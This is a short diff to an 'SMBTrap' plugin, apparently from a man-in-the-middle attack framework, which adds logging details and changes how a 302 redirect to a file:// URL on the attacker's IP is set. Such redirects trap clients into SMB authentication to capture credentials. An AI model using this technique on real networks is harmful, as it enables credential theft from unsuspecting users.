@@ -33,6 +33,6 @@ class SMBTrap(Plugin):
 		return {"request": request, "version": version, "code": 302, "message": "Found"}
 
 	def responseheaders(self, response, request):
-		self.clientlog.info("Trapping request to {}".format(request.headers['host']))
+		self.clientlog.info("Trapping request to {}".format(request.headers['host']), extra=request.clientInfo)
 		rand_path = ''.join(random.sample(string.ascii_uppercase + string.digits, 8))
-		response.headers["Location"] = "file://{}/{}".format(self.ip, rand_path)
+		response.responseHeaders.setRawHeaders('Location', ["file://{}/{}".format(self.ip, rand_path)])
